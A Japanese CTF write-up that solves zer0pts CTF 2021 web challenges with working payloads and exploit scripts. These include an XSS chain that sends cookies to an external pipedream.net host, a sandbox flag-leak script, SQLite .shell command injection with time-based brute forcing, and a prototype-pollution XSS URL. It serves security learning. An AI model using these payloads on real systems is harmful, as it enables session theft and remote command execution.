---
title: zer0pts CTF 2021 writeup (3 web challs)
thumbnail: /images/2021/20210309-zer0ptsctf-diploma.png
date: 2021-03-09 1:00:00
tags:
    - CTF
---

zer0pts CTF 2021 にチーム ./Vespiary として参加して15位でした！

<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">zer0pts CTF 2021 お疲れさまでした。15位！<br>僕はSimple Blog、Kantan Calc、Baby SQLiを解きました。PDF Generatorは時間切れ <a href="https://t.co/mNnzV09fTw">pic.twitter.com/mNnzV09fTw</a></p>&mdash; Ark (@arkark_) <a href="https://twitter.com/arkark_/status/1368536394910429186?ref_src=twsrc%5Etfw">March 7, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

解いた問題のwriteupを書きます。順番は解いた順です[^1]。Kantan Calcはチームメンバーと一緒に解きました。

[^1]: Simple Blogを最初に解き始めた理由は部分文字列に「Blog」が含まれていたからです。というのも、最近CSP bypass系の問題にはまっているのですがそれ系統の問題には「Blog」とか「Note」とかが問題文に含まれることが多いからです。

- 公式サイト: https://2021.ctf.zer0pts.com/index.html
- 公式リポジトリ: https://gitlab.com/zer0pts/zer0ptsctf-2021-challenges
- 公式writeup: https://hackmd.io/@ptr-yudai/B1bk04fmu

## [web] Simple Blog

192pts, 23solves

- 公式writeup: https://hackmd.io/@st98/S1z9qV1X_
- 問題文:
    > Now I am developing a blog service. I'm aware that there is a simple XSS. However, I introduced strong security mechanisms, named Content Security Policy and Trusted Types. So you cannot abuse the vulnerability in any modern browsers, including Firefox, right?

### 問題概要

- 自明なXSSが可能だが、CSPとTrusted Typesで守られたブログサイトが与えられる
    - URLの`theme`クエリにXSSを仕込むことが可能
- botにURLをreportすることが可能
    - フラグはbotのcookieに設置されている

### 解法概略

Dangling Markup Injection + DOM Clobbering + JSONPの悪用

### 考察

まずは、CSPがヘッダではなくmetaタグで設定されていることが怪しかったのでググったりW3Cのドキュメントを読んだり[^2]しましたが、特に攻撃に繋がりそうなものは見つからなかったです。

[^2]: 知見として得られたもので以下のものは今後のCTFでの考察に使えそうです：「複数のCSPが設定されていた場合は、既存のCSPよりさらに制限するようなポリシーしか追加できない。これはmetaタグによる設定でも同様」「`'strict-dynamic'`が指定されていたとしてもparser-insertedなscriptの挿入は認められない」「metaタグで指定されたポリシーは、その記述より前のコンテンツには適用されない」（ref. https://www.w3.org/TR/CSP3/ ）。

次にTrusted Types周りについて調べました。[MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/trusted-types)によると、まだ実験段階の機能で、ChromeではサポートされているがFirefoxではサポートされていないようです。問題のHTML内でロードされている[`trustedtypes.build.js`](https://github.com/w3c/webappsec-trusted-types)は、Trusted Typesのpolyfillであることもわかりました。

問題文からbotがFirefoxであることが示唆されていますが、明示はされていないのでリダイレクトによってuser-agentをチェックします：
```javascript
encodeURIComponent('"> <meta http-equiv="refresh" content="0;URL=https://evil.example.com"> <"')
```
の値をreportすると
```
user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
```
が返ってきた[^3]ので、[WhatIsMyBrowser](https://developers.whatismybrowser.com/)で調べると`Firefox 88 on Linux`でFirefoxであることが確認できました。

[^3]: 現状のCSPでは（たぶん）metaタグによるリダイレクトをブロックできないので、便利テクニックとして使ってます。[navigate-toディレクティブ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/navigate-to)が導入されたらこの手は使えなくなるのだろうか。

ところでFirefoxと言えば、Dangling Markup Injectionの防御機構がない[^4]ので、その辺りでうまく攻撃できないか検討しました。

[^4]: Chromeでは`\n`と`<`の両方を含むURLへのアクセスがブロックされます（ref. https://www.chromestatus.com/feature/5735596811091968 ）。日本語の資料では[こことか](https://speakerdeck.com/shhnjk/burauzasekiyuriteiji-neng-ha-baipasusareruwei-niaru?slide=24)で言及されています[^5]。ただし今回の攻撃手法がChromeでうまく動作しないのは、これが原因ではなくTrusted Typesがサポートされていることが原因です。

[^5]: ところで[Shibuya.XSS](https://shibuyaxss.connpass.com/)の過去資料を漁ってるとおもしろい情報がたくさん得られるので、次回開催が楽しみです。前回開催時はCTFをやってなくて申し込まなかったのが悔やまれます。

```javascript
location = "http://web.ctf.zer0pts.com:8003/?theme=" + encodeURIComponent('> <script "')
```
を手元で実行すると、DOMの構造が崩れて下の画像のように`/js/trustedtypes.build.js`を読み込まなくなります。
![](/images/2021/20210309-zer0ptsctf-simpleblog-01.png)

Trusted Typesのpolyfillが無効になりました。嬉しい。

今度は、
```
Uncaught ReferenceError: trustedTypes is not defined
    init http://web.ctf.zer0pts.com:8003/?theme=> <script ":83
    <anonymous> http://web.ctf.zer0pts.com:8003/?theme=> <script ":92
```
と怒られます。これは、`/js/trustedtypes.build.js`を読み込まなかったことによって`trustedTypes`変数がundefinedになったことが原因です。グローバル変数なのでDOM Clobberingによって適当に定義すればOKです。
```javascript
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }
```
ともあるので、`trustedTypes.defaultPolicy`の値をtruthyにする必要があります。
```html
<form id=trustedTypes><input name=defaultPolicy></form>
```
このようなDOMがあれば大丈夫でしょう。さらに
```javascript
      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
```
で好きなcallbackの値を設置したい場合は
```html
<a id=callback href='x:console.log'></a>
```
を放り込めばOKです。ここで、`x:`のようなスキームを指定しないと`window.callback`の値が`http://web.ctf.zer0pts.com:8003/console.log`になってしまうことに注意する必要があります。

というわけでこれらを組み合わせて
```javascript
location = "http://web.ctf.zer0pts.com:8003/?theme=" + encodeURIComponent('> <form id=trustedTypes><input name=defaultPolicy></form> <a id=callback href=\'x:console.log\'></a> <script "')
```
を手元で実行すると
![](/images/2021/20210309-zer0ptsctf-simpleblog-02.png)
のように`Array [ {…}, {…} ]`が出力されます。

あとはcookieを奪取するスクリプトを投げればいいのですが`api.php`を見ると、
```php
if (strlen($callback) > 20) {
  die('throw new Error("callback name is too long")');
}
```
このように「20文字以下」という制限があります。普通にfetch関数を使ったりすると余裕でオーバーします。

既存のコードを眺めると`jsonp`という便利そうな関数が定義されています。そこで、`callback`の値を`x:jsonp(a);`にし、DOM Clobberingで`a`の値を好きなjavascriptコードにすればうまくいきそうです。ただし、`jsonp`の第1引数はURLであるため`data:text/javascript,...`を使いました。

### 攻撃

最終的に
```javascript
encodeURIComponent('> <form id=trustedTypes><input name=defaultPolicy></form> <a id=a href=\'data:text/javascript,location=`https://enp4oaz0o4e4vlk.m.pipedream.net?cookie=${document.cookie}`\'></a> <a id=callback href=\'x:jsonp(a);\'></a> <script "')
```
をして、
```
theme=%3E%20%3Cform%20id%3DtrustedTypes%3E%3Cinput%20name%3DdefaultPolicy%3E%3C%2Fform%3E%20%3Ca%20id%3Da%20href%3D'data%3Atext%2Fjavascript%2Clocation%3D%60https%3A%2F%2Fenp4oaz0o4e4vlk.m.pipedream.net%3Fcookie%3D%24%7Bdocument.cookie%7D%60'%3E%3C%2Fa%3E%20%3Ca%20id%3Dcallback%20href%3D'x%3Ajsonp(a)%3B'%3E%3C%2Fa%3E%20%3Cscript%20%22
```
をreportすると、`https://evil.example.com`にcookieの値が投げられます。

![](/images/2021/20210309-zer0ptsctf-simpleblog-03.png)
が返ってきました。

### フラグ

`zer0pts{1_w4nt_t0_e4t_d0m_d0m_h4mburger_s0med4y}`

DOM Clobbering、最近聞く機会が多かったので本番で解けてよかったです。

あとこれ嬉しい ↓
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">Dangling markup injection本当ですか? 非想定解法です…</p>&mdash; st98 (@st98_) <a href="https://twitter.com/st98_/status/1368541139041546241?ref_src=twsrc%5Etfw">March 7, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

## [web] Kantan Calc

135pts, 50solves

- 公式writeup: https://hackmd.io/@st98/Sy7D5NymO
- 問題文:
    > "Kantan" means simple or easy in Japanese.

### 問題概要

- サーバのソースコード中に直書きされているフラグを出力させる問題
- シンプルなコードゴルフ

### 解法概略

JavaScriptのコードゴルフ

### 考察

```javascript
app.get('/', function (req, res, next) {
  let output = '';
  const code = req.query.code + '';

  if (code && code.length < 30) {
    try {
      const result = vm.runInNewContext(`'use strict'; (function () { return ${code}; /* ${FLAG} */ })()`, Object.create(null), { timeout: 100 });
      output = result + '';
      if (output.includes('zer0pts')) {
        output = 'Error: please do not exfiltrate the flag';
      }
    } catch (e) {
      output = 'Error: error occurred';
    }
  } else {
    output = 'Error: invalid code';
  }

  res.render('index', { title: 'Kantan Calc', output });
});
```
サーバのコードの一部分はこのようになっています。非常にシンプルです。

```javascript
`'use strict'; (function () { return ${code}; /* ${FLAG} */ })()`
```
に適切な`code`の値を指定して、`FLAG`を出力させるようにすればよいです。ただし、

- 出力されるコードには`zer0pts`の部分文字列があるとダメ
- 文字数制限が30文字未満

という制約があります。

最初は`},function a(){return a`のような断片を考えました。これを投げると
```javascript
'use strict'; (function () { return },function a(){return a;/* zer0pts{xxx} */ })()
```
になります。これは関数を文字列に変換するときに関数の定義が漏れてしまうことを利用しています。
![](/images/2021/20210309-zer0ptsctf-kantancalc-01.png)

`Error: please do not exfiltrate the flag`のエラーが出たので、無事（？）フラグが出力されていることが確認できました。

`zer0pts`が含まれないようにするための方針として、一文字ずつ取得させる方法を考えました。
上述の断片だと例えば
```
},function a(){return(a+'')[20]
```
を投げると20文字目が返ってきます。ただし31文字で字数オーバーです。

この後いろいろ考えてたら
```
},_=>_=>{
```
という短い断片（9文字！）でフラグ全体が出力される方法を思いつきました。
復元すると
```javascript
'use strict'; (function () { return },_=>_=>{;/* zer0pts{xxx} */ })()
```
になります。これを起点にこねくり回したらいい感じにできました。

```
});(a=>_=>(a+'')[16])(_=>{
```
最終的に攻撃に用いた断片はこれです（26文字）。
復元すると
```javascript
'use strict'; (function () { return });(a=>_=>(a+'')[16])(_=>{;/* zer0pts{xxx} */ })()
```
になります。
![](/images/2021/20210309-zer0ptsctf-kantancalc-02.png)
良さそうです。

### 攻撃

手動で一文字ずつ確定させるのは大変なのでスクリプトを書きました[^6]。
```python
import httpx
import urllib
import time

flag = ""

index = 0
while not flag.endswith("}"):
    time.sleep(0.01)
    payload = urllib.parse.quote("});(a=>_=>(a+'')[" + str(index) + "])(_=>{")
    res = httpx.get(
        f"http://web.ctf.zer0pts.com:8002/?code={payload}"
    )
    assert res.status_code == 200
    flag += res.text[res.text.find("</output>")-1]
    print(flag)
    index += 1
print("result: ", flag)
```

[^6]: 今までPythonでHTTPリクエストを投げるときには[requests](https://requests.readthedocs.io/en/master/)を使ってたのですが、最近は[httpx](https://www.python-httpx.org/)を使うように変更しました。APIはrequestsと似た感じで使いやすく、さらに標準で非同期通信にも対応していて便利です。あとこちらの方が後発で洗練されている印象を受けています（未確認です。気のせいかもしれません）。

実行すると次のように出力されます。
```sh
$ python exploit.py
_
_=
_=;
_=;{
_=;{;
_=;{;
_=;{; /
_=;{; /*
_=;{; /*
_=;{; /* z
_=;{; /* ze
_=;{; /* zer
_=;{; /* zer0
_=;{; /* zer0p
_=;{; /* zer0pt
_=;{; /* zer0pts
_=;{; /* zer0pts{
_=;{; /* zer0pts{K
_=;{; /* zer0pts{K4
_=;{; /* zer0pts{K4n
_=;{; /* zer0pts{K4nt
_=;{; /* zer0pts{K4nt4
_=;{; /* zer0pts{K4nt4n
_=;{; /* zer0pts{K4nt4n_
_=;{; /* zer0pts{K4nt4n_m
_=;{; /* zer0pts{K4nt4n_m3
_=;{; /* zer0pts{K4nt4n_m34
_=;{; /* zer0pts{K4nt4n_m34n
_=;{; /* zer0pts{K4nt4n_m34ns
_=;{; /* zer0pts{K4nt4n_m34ns_
_=;{; /* zer0pts{K4nt4n_m34ns_4
_=;{; /* zer0pts{K4nt4n_m34ns_4d
_=;{; /* zer0pts{K4nt4n_m34ns_4dm
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1o
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3
_=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}
result:  _=;{; /* zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}
```

### フラグ

`zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}`

### おまけ

公式writeupによるスプレッド構文解法を真似ると
```
});(a=>_=>[...a+0])(_=>{
```
の断片で良いことがわかるので、1回のリクエストでフラグが入手できました！24文字！
![](/images/2021/20210309-zer0ptsctf-kantancalc-03.png)

## [web] Baby SQLi

170pts, 30solves

- 公式writeup: https://hackmd.io/@st98/S1cf6iyQd
- 問題文:
    > Just login as admin.

### 問題概要

- adminとしてログインするとフラグが見れるサービスが与えられる
- ログインではSQLiが可能
    - RDBMSはSQLite

### 解法概略

複文を用いてシェルコマンドを実行 + time-based blind SQL injection + コードゴルフ

### 考察

前提として、DB内のパスワードを盗んだとしても、SHA256のハッシュ値なのでそれを利用してログインすることは不可能に近いです。つまり、`templates/index.html`内のフラグを直接盗むような攻撃を考える必要があります。

webサーバを読むと
```python
        result = sqlite3_query(
            'SELECT * FROM users WHERE username="{}" AND password="{}";'
            .format(sqlite3_escape(username), password_hash)
        )
```
に対し、`username`のクエリパラメータを用いてinjectionが可能だとわかります。ただし、
```python
def sqlite3_escape(s):
    return re.sub(r'([^_\.\sa-zA-Z0-9])', r'\\\1', s)
```
によって、記号の類の文字の前には`\`というごみが入ります。

SQLiteのドキュメントを読むと
> C-style escapes using the backslash character are not supported because they are not standard SQL.
> ref. https://www.sqlite.org/lang_expr.html
と書いてあるので、文字列リテラル中に`\`が普通に使えることがわかるので、文字列を脱出する分には問題はないことがわかりました。

次にSQLを実行してる部分のソースコードを読むと
```python
def sqlite3_query(sql):
    p = subprocess.Popen(['sqlite3', 'database.db'],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    o, e = p.communicate(sql.encode())
    if e:
        raise Exception(e)
    result = []
    for row in o.decode().split('\n'):
        if row == '': break
        result.append(tuple(row.split('|')))
    return result
```
どうやらsubprocessとしてsqlite3コマンドを実行して、そのREPL環境で文字列を流し込んでいるようです。
つまり、複文使い放題ということです。幸いなことに`sqlite3_escape`は`\n`もエスケープしません。

ところで、`sqlite3_escape`が`.`も許容していることがとても気になります。怪しいです。非常に。

というわけで、SQLiteの構文で`.`を使ったものがあるか調べると[dot-command](https://sqlite.org/cli.html#:~:text=dot-commands)というものがありました。`.system`や`.shell`でシェルコマンドを叩けるので何でもできそうです。

例えば
```sh
cat templates/index.html | grep zer0pts{prefix && sleep 10
```
のようなコマンドを実行すると、`zer0pts{prefix`がヒットしたときだけタイムアウトし、ヒットしなかったときはすぐにレスポンスが返ってくるようになるため、time-basedなblind SQLiができそうです。

```
";\n.shell cat templates/index.html|grep zer0pts{prefix&&sleep 9\n
```
を投げてみましょう（ここで`\n`は改行文字です）。

```fish
$ http --form --follow POST http://web.ctf.zer0pts.com:8004/login username='";'\n'.shell cat templates/index.html | grep zer0pts{ && sleep 10'\n password=abc
HTTP/1.0 200 OK
Content-Length: 697
Content-Type: text/html; charset=utf-8
Date: Mon, 08 Mar 2021 15:27:15 GMT
Server: Werkzeug/1.0.1 Python/3.7.10
Set-Cookie: session=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
    </head>

    <body>
        <h1>Login</h1>
        <form action="/login" method="post">

            <p style="color:red">Too long username or password</p>

            <label for="username">Username: </label>
            <input id="username" name="username" type="text" placeholder="Username (letters, digits, underscores and whitespaces)"><br>
            <label for="password">Password: </label>
            <input id="password" name="password" type="password" placeholder="Password"><br>
            <input type="submit" value="Login">
        </form>
    </body>
</html>
```

`Too long username or password`と怒られてしまいました。
ソースコードを読むと
```python
    if len(username) > 32 or len(password) > 32:
        flask.session['msg'] = 'Too long username or password'
        return flask.redirect(flask.url_for('home'))
```
とあり、32文字以下という制限があります。

とりあえず
```
";\n.shell cat */*|grep s{prefix&&top\n
```
でだいぶ短くなりました。
文字数は `31 + len(prefix)` です。厳しい。

これより短くする方法がしばらく思いつかなかったのですが、grepの引数のところで3文字まで使えることから、3文字ずつ判定するクエリを投げる方法でフラグを確定できないかと考え、スクリプトを書きました。

### 攻撃

できたスクリプトはこちらです。

```python
import httpx
import string

chars = "_}" + string.ascii_letters + string.digits

url = "http://web.ctf.zer0pts.com:8004/login"
# url = "http://localhost:8004/login"


def query(prefix: str) -> bool:
    n = 3
    chunk = prefix[-n:]
    payload = '";\n.shell cat */*|grep ' + chunk + '&&top\n'
    data = {
        "username": payload,
        "password": "abc",
    }

    try:
        res = httpx.post(url, data=data, timeout=3)
        assert res.status_code == 200
        assert "Too long username or password" not in res.text
        return False
    except httpx.ReadTimeout:
        return True


def rec(current_prefix: str) -> bool:
    if current_prefix.endswith("}"):
        print("result: ", current_prefix)
        return True

    print(current_prefix)
    for c in chars:
        prefix = current_prefix + c
        if query(prefix):
            if rec(prefix):
                return True
    return False


prefix = "zer0pts{"  # zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4
rec(prefix)
```

これは、「prefixの末尾2文字」と「新たな1文字」結合した「3文字」を深さ優先探索で調べるスクリプトになります。
正直最悪です。これを実行すると

```sh
$ python exploit.py
zer0pts{
zer0pts{w
zer0pts{w0
zer0pts{w0r
zer0pts{w0rd
zer0pts{w0w
zer0pts{w0w_
zer0pts{w0w_d
zer0pts{w0w_d1
zer0pts{w0w_d1d
zer0pts{w0w_d1d_
zer0pts{w0w_d1d_u
zer0pts{w0w_d1d_u_
zer0pts{w0w_d1d_u_c
zer0pts{w0w_d1d_u_cr
zer0pts{w0w_d1d_u_cr4
zer0pts{w0w_d1d_u_cr4c
zer0pts{w0w_d1d_u_cr4ck
zer0pts{w0w_d1d_u_cr4ck_
zer0pts{w0w_d1d_u_cr4ck_S
zer0pts{w0w_d1d_u_cr4ck_SH
zer0pts{w0w_d1d_u_cr4ck_SHA
zer0pts{w0w_d1d_u_cr4ck_SHA2
zer0pts{w0w_d1d_u_cr4ck_SHA25
zer0pts{w0w_d1d_u_cr4ck_SHA256
zer0pts{w0w_d1d_u_cr4ck_SHA256_
zer0pts{w0w_d1d_u_cr4ck_SHA256_0
zer0pts{w0w_d1d_u_cr4ck_SHA256_0f
zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_
zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_m
zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my
zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_
zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p
zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4
```

と出力されました。20分くらいリクエストを投げ続けたので、本当にごめんなさい。

途中で止まったのは、`..._of_my_p4`の次が記号だからと思われます。
上の方の出力を見ると`w0r`と`0rd`がヒットしているので、
最終的なフラグは
`zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4**w0rd*}`
だと推測しました（`*`は不明な文字）。

個別に3文字ずつ判定すると

- `sw0` → ヒットしない
- `w0r` → ヒット
- `0rd` → ヒット
- `rd?` → ヒット
- `d?}` → ヒット

だったので、
`zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4**w0rd?}`
が確定しました。

`s`に対応するleetを調べると`5`、`$`、`§`でした[^7]。`5`だった場合スクリプトで検出されたはずなので`$`か`§`です。

[^7]: https://simple.wikipedia.org/wiki/Leet

zer0pts CTFのフラグフォーマットは`zer0pts\{[\x20-\x7e]+\}`なので`$`っぽいです。

というわけで
`zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}`
を投げるとcorrectが返ってきました。とてもお行儀が悪かったです。ごめんなさい。

### フラグ

`zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}`

## その他の問題

コンテスト中には他にGuestFS:AFRとPDF Generatorに挑みました。

### [web, warmup] GuestFS:AFR (232pts, 15solves)

こちらはrace conditionを疑っていろいろがんばってる途中でチームメンバーがさくっと解いてくれました。迷走してる間に他の人が解いてくれるのは非常にありがたいです。チーム戦の利点のひとつ。

解法を聞くと非常にシンプルで、なるほどたしかにwarmupだと思いましたが、solvesを見ると少ないのでみんな自分みたいにRCを疑ったんだろうなあと邪推しました。

### [web] PDF Generator (214pts, 18solves)

`bundle.js`の`parseQuery`が自前実装っぽいことに気づき、ロジックを読むとprototype pollutionできることがわかりました。

あとはVue.jsのtemplate機能を汚染すると、任意スクリプトが叩けることに気づきます。

```
https://pdfgen.ctf.zer0pts.com:8443/text?name=x&text=x&__proto__[template][nodeType]=x&__proto__[template][innerHTML]=%3Cscript%3Ealert(0)%3C/script%3E
```
これで`alert(0)`です。

このあとembedされたデータをどうやって取得するべきかを考えてる途中でCTFが終了しました。
まだ、公式writeupをちゃんと読んでいないので、これから復習予定です。
Vue.jsを汚染した段階でも結構むずかしかったと感じてるので、Not PDF Generatorも含めて激ヤバ感があります。

## 感想

### CTFに対して

異常クオリティCTFありがとうございました。

自分はwebしか問題を見ていないですが、少なくとも見た問題はすべて「ソースコードを与えるなど問題に集中できるようにつくられている」「解法が自明でなく解きごたえがある」といった特長があり、とてもたのしくCTFをプレイすることができました。

あと、今回解いた問題の中ではSimple Blogが一番好きです。

### 自分に対して

webの中難度程度の問題は解けるようになってきたので、だいぶ実力が付いてきた実感が湧いていて純粋に嬉しいです。難しいCTFの1桁solvesの問題を1問以上解くことが当面の目標です。

また、そのうち参加者の視点ではなく、運営者の視点で感想が書ける日を迎えたいです。
